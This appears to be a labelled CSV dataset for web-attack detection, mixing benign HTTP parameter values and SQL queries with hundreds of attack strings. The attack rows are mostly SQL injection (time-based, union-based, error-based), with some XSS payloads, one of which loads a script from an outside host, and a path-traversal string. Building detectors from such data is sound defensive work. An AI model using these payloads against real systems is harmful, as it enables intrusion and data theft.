payload,attack_type,is_attack,source
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",sqli,1,SQLiV3
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,sqli,1,SQLiV3
orejana,norm,0,HttpParamsDataset
"  SELECT * FROM step WHERE knew IN  ( 'suit', 'shine', 'pot' )  ",norm,0,SQLiV3
54716363f,norm,0,HttpParamsDataset
ecija 51 12-h,norm,0,HttpParamsDataset
1 where 2382  =  2382,sqli,1,SQLiV3
SELECT * FROM collect WHERE please = 'lesson' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
winston@chinavende.bi,norm,0,HttpParamsDataset
88903644l,norm,0,HttpParamsDataset
masegosa,norm,0,HttpParamsDataset
mathieso,norm,0,HttpParamsDataset
SELECT * FROM doubt,norm,0,SQLiV3
cabral_crowther@frioelectric.br,norm,0,HttpParamsDataset
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",sqli,1,SQLiV3
matthiew,norm,0,HttpParamsDataset
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",sqli,1,HttpParamsDataset
SELECT mental FROM double UNION ALL SELECT were FROM sold ORDER BY rice,norm,0,SQLiV3
"  SELECT molecular,my FROM attempt WHERE principle = 'far' UNION SELECT want, behind FROM bigger",norm,0,SQLiV3
4358738088308536,norm,0,HttpParamsDataset
"1) where 7748=7748 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,HttpParamsDataset
SELECT MIN ( tales )  AS equally FROM program,norm,0,SQLiV3
veguos@schnapps.com.mn,norm,0,HttpParamsDataset
SELECT * FROM proper WHERE    NOT built = 'well',norm,0,SQLiV3
deba,norm,0,HttpParamsDataset
"  SELECT eatenID AS ID, at AS push FROM cap",norm,0,SQLiV3
5762011011583829,norm,0,HttpParamsDataset
"1))) union all select null,null,null,null,null,null#",sqli,1,HttpParamsDataset
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ossj'  =  'ossj",sqli,1,SQLiV3
pelle1@906.com.aq,norm,0,HttpParamsDataset
SELECT * FROM movement WHERE stuck = 'combination'  AND  ( change = 'apartment' OR widely = 'egg' ) ,norm,0,SQLiV3
SELECT * FROM movie,norm,0,SQLiV3
7686270000000000,norm,0,SQLiV3
6821418764083161,norm,0,HttpParamsDataset
"-5052   )    )     )   union all select 8351,8351,8351,8351#",sqli,1,SQLiV3
SELECT its FROM deal,norm,0,SQLiV3
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""%""=""",sqli,1,HttpParamsDataset
"-4934"" union all select 5119,5119,5119,5119,5119--",sqli,1,HttpParamsDataset
1'||(select 'ucxp' where 6612=6612 order by 1--,sqli,1,HttpParamsDataset
povedilla,norm,0,HttpParamsDataset
41100,norm,0,HttpParamsDataset
0911357592887177,norm,0,HttpParamsDataset
SELECT * FROM liquid ORDER BY pond,norm,0,SQLiV3
1) where 8232=8232 and (3020=3020)*6703--,sqli,1,HttpParamsDataset
9.03287E+015,norm,0,SQLiV3
SELECT * FROM right FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grow,norm,0,SQLiV3
sielanski@prestamosypersonales.bj,norm,0,HttpParamsDataset
SELECT option_value FROM wp_options WHERE option_name  =  '_options_contact_email' LIMIT 1,norm,0,SQLiV3
pols,norm,0,HttpParamsDataset
1%';begin user_lock.sleep(5); end--,sqli,1,HttpParamsDataset
"  SELECT shine,sharp,progress FROM slope LEFT JOIN Orders ON impossible.explanationID =  shape.good ORDER BY join.bee",norm,0,SQLiV3
2993,norm,0,HttpParamsDataset
SELECT paper FROM corn,norm,0,SQLiV3
"1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  '",sqli,1,SQLiV3
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",sqli,1,SQLiV3
grupo cooperativa obreros talleres deusto 147 6?h,norm,0,HttpParamsDataset
SELECT COUNT ( news ) FROM lamp,norm,0,SQLiV3
1' in boolean mode);select case when 7649=9297 then 1 else null end--,sqli,1,HttpParamsDataset
1%') rlike (select (case when (1210=8664) then 1 else 0x28 end)) and ('%'=',sqli,1,HttpParamsDataset
5838990000000000,norm,0,SQLiV3
"pl. finlandia, 58, 7?d",norm,0,HttpParamsDataset
"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>",xss,1,HttpParamsDataset
"  SELECT lot AS term, gulf AS [tax]  FROM upon",norm,0,SQLiV3
"1 union all select null,null,null,null,null,null,null#",sqli,1,HttpParamsDataset
"1"";select (case when (3140=4625) then 1 else 3140*(select 3140 from master..sysdatabases) end)--",sqli,1,HttpParamsDataset
galatas,norm,0,HttpParamsDataset
8175930764478311,norm,0,HttpParamsDataset
"   SELECT COUNT ( uncle ) , day FROM family BY instant",norm,0,SQLiV3
SELECT * FROM value WHERE floating IN  ( SELECT has FROM country ) ,norm,0,SQLiV3
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,sqli,1,SQLiV3
keene3@irmedia.gm,norm,0,HttpParamsDataset
san perfecto 8,norm,0,HttpParamsDataset
valadao@salaparis.ls,norm,0,HttpParamsDataset
"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",sqli,1,SQLiV3
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""=""",sqli,1,HttpParamsDataset
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,sqli,1,SQLiV3
grgar8,norm,0,HttpParamsDataset
3728906567349968,norm,0,HttpParamsDataset
ngoc,norm,0,HttpParamsDataset
2639,norm,0,HttpParamsDataset
8409,norm,0,HttpParamsDataset
in4o75u1t4!bili0a1,norm,0,HttpParamsDataset
"calle oroya 191,",norm,0,HttpParamsDataset
"passatge de felipe de paz 31, 8?b",norm,0,HttpParamsDataset
"1%'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='",sqli,1,HttpParamsDataset
"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",sqli,1,SQLiV3
1') where 6045=6045;select (case when (9907=2736) then 9907 else 9907*(select 9907 from mysql.db) end)#,sqli,1,HttpParamsDataset
"1   )    )    as shmg where 1371  =  1371 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,SQLiV3
trisca,norm,0,HttpParamsDataset
SELECT * FROM local WHERE go = 'western' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
enris6rar,norm,0,HttpParamsDataset
SELECT mind FROM instrument UNION ALL SELECT example FROM extra ORDER BY pitch,norm,0,SQLiV3
calle correa de arauxo 176,norm,0,HttpParamsDataset
"1);select benchmark(5000000,md5(0x714e4153))#",sqli,1,HttpParamsDataset
SELECT * FROM practice WHERE twenty BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
SELECT AVG ( touch ) FROM then,norm,0,SQLiV3
e298r4jina715,norm,0,HttpParamsDataset
5400000000000000,norm,0,SQLiV3
"1') as yhgk where 9246=9246 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,HttpParamsDataset
illa,norm,0,HttpParamsDataset
1702414193720942,norm,0,HttpParamsDataset
"1"" where 6347=6347 union all select null,null,null,null,null,null,null,null#",sqli,1,HttpParamsDataset
SELECT * FROM bridge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM disease,norm,0,SQLiV3
"-8382""   )    )    order by 1--",sqli,1,SQLiV3
oroz-betelu,norm,0,HttpParamsDataset
78977050h,norm,0,HttpParamsDataset
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq",sqli,1,SQLiV3
FROM  ( SELECT DISTINCT missing FROM wrapped ) ,norm,0,SQLiV3
1  )   as itvm where 1482  =  1482,sqli,1,SQLiV3
33784,norm,0,HttpParamsDataset
"1' and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli,1,SQLiV3
eficientemente,norm,0,HttpParamsDataset
"1"")) as jmoy where 9676=9676 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,HttpParamsDataset
" SELECT * FROM already ORDER BY hospital ASC, gone DESC",norm,0,SQLiV3
SELECT * FROM boat WHERE service = 'chart'  AND  ( yourself = 'rapidly' OR wide = 'shout' ) ,norm,0,SQLiV3
1'+  (  select trte where 9173  =  9173 and 2006  =  2006,sqli,1,SQLiV3
SELECT try FROM load UNION ALL SELECT nervous FROM making ORDER BY solid,norm,0,SQLiV3
henson_shah@eco-pro.cx,norm,0,HttpParamsDataset
a8errad1r,norm,0,HttpParamsDataset
arroc9era,norm,0,HttpParamsDataset
"-5355"" or make_set  (  9354  =  9354,7185  )  ",sqli,1,SQLiV3
SELECT * FROM needs  WHERE dangerous NOT LIKE '[occasionally]%',norm,0,SQLiV3
"calle alfred nobel, 42 7-g",norm,0,HttpParamsDataset
SELECT AVG ( they ) FROM bone,norm,0,SQLiV3
peimel,norm,0,HttpParamsDataset
"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",sqli,1,SQLiV3
faci59ado,norm,0,HttpParamsDataset
95549133a,norm,0,HttpParamsDataset
"  SELECT onceID AS ID, young AS modern FROM knife",norm,0,SQLiV3
SELECT * FROM science WHERE matter BETWEEN 'season' AND 'sides',norm,0,SQLiV3
"-4721'  )   or elt  (  4378  =  5165,5165  )   and   (  'fufn'  =  'fufn",sqli,1,SQLiV3
"1) and 8407=(select count(*) from generate_series(1,5000000))",sqli,1,HttpParamsDataset
"nuestra seora de las angustias s/n,",norm,0,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM gravity,norm,0,SQLiV3
"1') as yuqv where 6007=6007 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,HttpParamsDataset
eberl,norm,0,HttpParamsDataset
othella,norm,0,HttpParamsDataset
mahonri,norm,0,HttpParamsDataset
tipton9,norm,0,HttpParamsDataset
" SELECT * FROM finish ORDER BY cow, sound",norm,0,SQLiV3
"SELECT * FROM differ WHERE signal BETWEEN ""living"" AND    ""arrangement""",norm,0,SQLiV3
2756434329152004,norm,0,HttpParamsDataset
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",sqli,1,SQLiV3
SELECT * FROM easy,norm,0,SQLiV3
SELECT * FROM rod  WHERE appearance = conversation,norm,0,SQLiV3
SELECT AVG ( pan ) FROM conversation SELECT SUM ( notice ) ,norm,0,SQLiV3
sescun3ia,norm,0,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property,norm,0,SQLiV3
"1"" where 9919=9919;select benchmark(5000000,md5(0x714e4153))#",sqli,1,HttpParamsDataset
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,HttpParamsDataset
suzan,norm,0,HttpParamsDataset
1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,sqli,1,SQLiV3
arme!lluela,norm,0,HttpParamsDataset
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,HttpParamsDataset
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",sqli,1,SQLiV3
"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli,1,SQLiV3
c/ marquesa de vilallonga 53 5f,norm,0,HttpParamsDataset
" SELECT * FROM show ORDER BY fellow ASC, wall DESC",norm,0,SQLiV3
"1'||(select 'sbft' where 8748=8748;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,HttpParamsDataset
5953,norm,0,HttpParamsDataset
8838380607178464,norm,0,HttpParamsDataset
"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sqli,1,SQLiV3
walberg@ytv.com.gn,norm,0,HttpParamsDataset
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,HttpParamsDataset
yoel,norm,0,HttpParamsDataset
53527134q,norm,0,HttpParamsDataset
"1'+(select 'fxhh' where 2571=2571 union all select null,null,null,null,null,null,null--",sqli,1,HttpParamsDataset
zarra,norm,0,HttpParamsDataset
"  SELECT * FROM mice WHERE buy IN  ( 'musical', 'tobacco', 'spent' )  ",norm,0,SQLiV3
36432557m,norm,0,HttpParamsDataset
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",sqli,1,HttpParamsDataset
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",sqli,1,HttpParamsDataset
95843081b,norm,0,HttpParamsDataset
02247,norm,0,HttpParamsDataset
06640,norm,0,HttpParamsDataset
SELECT option_value FROM wp_options WHERE option_name  =  'options_youtube_url' LIMIT 1,norm,0,SQLiV3
"  SELECT form,last FROM break WHERE paragraph = 'summer' UNION SELECT drive, blanket FROM current",norm,0,SQLiV3
25512,norm,0,HttpParamsDataset
saunder,norm,0,HttpParamsDataset
SELECT * FROM official 3,norm,0,SQLiV3
"1%"" union all select null,null,null,null--",sqli,1,HttpParamsDataset
1') rlike sleep(5)#,sqli,1,HttpParamsDataset
37793,norm,0,HttpParamsDataset
SELECT * FROM them ORDER BY anyway DESC,norm,0,SQLiV3
SELECT * FROM stop WHERE chart NOT LIKE '[cutting]%',norm,0,SQLiV3
9.0199E+015,norm,0,SQLiV3
SELECT bell ( s )  FROM only LEFT JOIN,norm,0,SQLiV3
"  SELECT shallowID AS ID, service AS carry FROM topic",norm,0,SQLiV3
26381112c,norm,0,HttpParamsDataset
SELECT * FROM soil FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,HttpParamsDataset
........................oot.ini,path-traversal,1,HttpParamsDataset
"-3226'||(select 'ykdw' where 2617=2617 union all select 2617,2617--",sqli,1,HttpParamsDataset
"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",sqli,1,SQLiV3
SELECT * FROM case FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM number,norm,0,SQLiV3
"INSERT INTO up ( simple, radio, act, combination, since, till )  VALUES  ( 'example', 'level'. took', 'account', 'at', 'dug', 'morning' )  ",norm,0,SQLiV3
arcngel,norm,0,HttpParamsDataset
c/ masia 111 10-g,norm,0,HttpParamsDataset
1'+  (  select 'mzee' where 5984  =  5984,sqli,1,SQLiV3
1%')) and (select * from (select(sleep(5)))fzno) and (('%'=',sqli,1,HttpParamsDataset
08263,norm,0,HttpParamsDataset
31013,norm,0,HttpParamsDataset
SELECT * FROM smell  WHERE roar NOT LIKE '[review]%',norm,0,SQLiV3
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,sqli,1,SQLiV3
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',norm,0,SQLiV3
SELECT vessels FROM of,norm,0,SQLiV3
SELECT * FROM exact WHERE consist NOT BETWEEN 'political' AND 'introduced',norm,0,SQLiV3
SELECT TOP 50 PERCENT * FROM noise,norm,0,SQLiV3
animador!a,norm,0,HttpParamsDataset
forst,norm,0,HttpParamsDataset
7198,norm,0,HttpParamsDataset
39515,norm,0,HttpParamsDataset
"  SELECT school,frighten FROM furniture WHERE path = 'needed' UNION SELECT century, secret FROM bet",norm,0,SQLiV3
1386580487506748,norm,0,HttpParamsDataset
SELECT * FROM move WHERE Price NOT BETWEEN 10 AND 20,norm,0,SQLiV3
ad5ma.sc9r,norm,0,HttpParamsDataset
"1%'   )    )    union all select null,null#",sqli,1,SQLiV3
nathalia,norm,0,HttpParamsDataset
SELECT * FROM somewhere 3,norm,0,SQLiV3
"1%') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",sqli,1,HttpParamsDataset
"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",sqli,1,HttpParamsDataset
4518,norm,0,HttpParamsDataset
SELECT * FROM ride WHERE exclaimed  BETWEEN 10 AND 20,norm,0,SQLiV3
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",sqli,1,SQLiV3
62381470l,norm,0,HttpParamsDataset
8693,norm,0,SQLiV3
morcn,norm,0,HttpParamsDataset
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,HttpParamsDataset
clovis,norm,0,HttpParamsDataset
"-1<br size=""&{document.cookie=true}"">",xss,1,HttpParamsDataset
"1"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""jzbb""=""jzbb",sqli,1,HttpParamsDataset
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1,HttpParamsDataset
"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",sqli,1,SQLiV3
nolie,norm,0,HttpParamsDataset
"   SELECT busy, heard+ ', ' + interior+ ' ' + history+ ', ' + usually AS own  FROM team",norm,0,SQLiV3
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,norm,0,SQLiV3
"1'+(select papc where 8900=8900 and elt(3114=3114,sleep(5))#",sqli,1,HttpParamsDataset
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('ngxz'='ngxz",sqli,1,HttpParamsDataset
rei1@rtce.au,norm,0,HttpParamsDataset
di7a?g7r,norm,0,HttpParamsDataset
SELECT AVG ( Price ) FROM western,norm,0,SQLiV3
-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,sqli,1,SQLiV3
verdier@zaya.name,norm,0,HttpParamsDataset
running,norm,0,HttpParamsDataset
"1 where 5925  =  5925 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli,1,SQLiV3
1)) as pjkd where 1105=1105 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,HttpParamsDataset
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""onhh""=""onhh",sqli,1,HttpParamsDataset
"1%'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",sqli,1,SQLiV3
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'zjnp'  =  'zjnp",sqli,1,SQLiV3
nictalopa,norm,0,HttpParamsDataset
tahull garola,norm,0,HttpParamsDataset
SELECT * FROM cent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM smoke,norm,0,SQLiV3
elsie,norm,0,HttpParamsDataset
revelante,norm,0,HttpParamsDataset
balcells parets,norm,0,HttpParamsDataset
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",sqli,1,SQLiV3
SELECT AVG ( both )  FROM bring  SELECT SUM ( herd ) ,norm,0,SQLiV3
SELECT leaf ( s )  FROM to UNION,norm,0,SQLiV3
"INSERT INTO behavior  ( becoming, bound, aloud )  VALUES  ( 'nearby', 'business', 'party' )  ",norm,0,SQLiV3
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",sqli,1,SQLiV3
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,sqli,1,SQLiV3
laticfero,norm,0,HttpParamsDataset
1 where 6304  =  6304,sqli,1,SQLiV3
